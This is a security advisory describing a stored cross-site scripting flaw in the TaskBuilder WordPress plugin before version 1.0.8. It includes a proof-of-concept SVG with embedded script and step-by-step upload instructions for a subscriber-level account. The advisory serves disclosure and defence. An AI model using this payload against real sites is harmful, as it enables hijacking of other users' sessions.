## WordPress Plugin Vulnerabilities

# TaskBuilder < 1.0.8 - Subscriber+ Stored XSS via SVG file upload

### Description

The plugin does not validate and sanitise task's attachments, which could allow any authenticated user (such as subscriber) creating a task to perform Stored Cross-Site Scripting by attaching a malicious SVG file

### Proof of Concept

Create a SVG with the following content:
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
alert(document.cookie);
</script>
</svg>
As any authenticated user, such as subscriber:
- Go to http://vuln.local/wp-admin/admin.php?page=wppm-tasks
- Choose any tasks (create one if there aren't any)
- Focus on "Write a comment".
- Click on "Attach Files" and select the SVG created above
- Click on "Send".
- View the attached SVG by clicking on its URL (https://example.com/?wppm\_attachment=86&tid=1&tac=OtjI9JpnQU), which will trigger the XSS
